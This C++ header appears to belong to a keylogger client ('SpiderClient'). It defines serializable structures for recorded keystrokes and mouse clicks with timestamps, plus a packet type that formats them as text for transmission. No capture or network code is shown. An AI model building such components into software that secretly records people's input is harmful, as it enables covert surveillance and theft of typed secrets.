//
// Created by lavigne on 10/5/17.
//

#ifndef SPIDERCLIENT_HPP
#define SPIDERCLIENT_HPP

#include <boost/archive/text_oarchive.hpp>
#include <boost/asio.hpp>

typedef struct s_kbData t_kbData;
typedef struct s_mouseData t_mouseData;

struct  s_kbData
{
	unsigned int    timestamp;
	std::string     key_code;
	int             status = 1;
	struct s_kbData *next;
	template<class Archive>
	void serialize(Archive &ar, const unsigned int version)
	{
		ar & timestamp;
		ar & key_code;
		ar & status;
		ar & next;
	}
};

struct  s_mouseData
{
	unsigned int        timestamp;
	int         key_code;
	int         x;
	int         y;
	int         status = 1;
	struct s_mouseData  *next;
	template<class Archive>
	void serialize(Archive &ar, const unsigned int version)
	{
		ar & timestamp;
		ar & key_code;
		ar & x;
		ar & y;
		ar & status;
		ar & next;
	}
};

typedef struct 	s_paquet
{
	char 		    opcode;
	std::string     id;
	t_kbData	    *kbdata;
	t_mouseData     *msdata;
	std::string toString() {
		std::string c_data(id);
		t_kbData    *kbData = kbdata;
		struct tm * timeinfo = new struct tm;

		c_data.append("\n");
		while (kbData != NULL) {
			time_t      rawTime = kbData->timestamp;
			char        kbBuf[26];

			c_data.append(kbData->key_code);
			c_data.append(" ");
			(kbData->status == 1 ? c_data.append("DOWN ") : c_data.append("UP "));
			/* Time */
			localtime_s(timeinfo, &rawTime);
			asctime_s(kbBuf, sizeof(kbBuf), timeinfo);
			c_data.append(kbBuf);
			kbData = kbData->next;
		}
		t_mouseData *msData = msdata;
		while (msData != NULL) {
			time_t      rawTime = msData->timestamp;
			char        msBuf[26];

			if (msData->key_code == 1) {
				c_data.append("Right Click at [");
			}
			else if (msData->key_code == 2) {
				c_data.append("Left Click at [");
			}
			else {
				c_data.append("Middle Click at [");
			}
			c_data.append(std::to_string(msData->x));
			c_data.append(";");
			c_data.append(std::to_string(msData->y));
			c_data.append("] DOWN ");
			/* Time */
			localtime_s(timeinfo, &rawTime);
			asctime_s(msBuf, sizeof(msBuf), timeinfo);
			c_data.append(msBuf);
			msData = msData->next;
		}
		return c_data;
	}
	template<class Archive>
	void serialize(Archive &ar, const unsigned int version)
	{
		ar & opcode;
		ar & kbdata;
		ar & msdata;
	}
}				t_paquet;

#endif //SPIDERCLIENT_HPP
